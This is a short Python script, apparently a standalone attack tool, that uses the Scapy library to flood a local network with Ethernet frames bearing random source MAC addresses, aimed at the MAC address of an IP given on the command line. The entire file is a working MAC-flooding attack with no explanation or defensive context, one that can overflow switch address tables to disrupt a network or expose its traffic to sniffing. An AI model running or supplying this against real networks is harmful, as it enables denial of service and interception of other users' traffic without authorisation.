from scapy.all import *
import random, sys

dst_mac = getmacbyip(sys.argv[1])
print("Starting MAC Flood...")

try: 
  while True:
    rmac = ":".join(['%02x' % random.randint(0x00, 0xFF) for _ in range(6)])
    packet = Ether(src = rmac, dst = dst_mac)
    sendp(packet, iface = "eth0", verbose = False)

except KeyboardInterrupt:
  print("Stopping MAC Flood..")

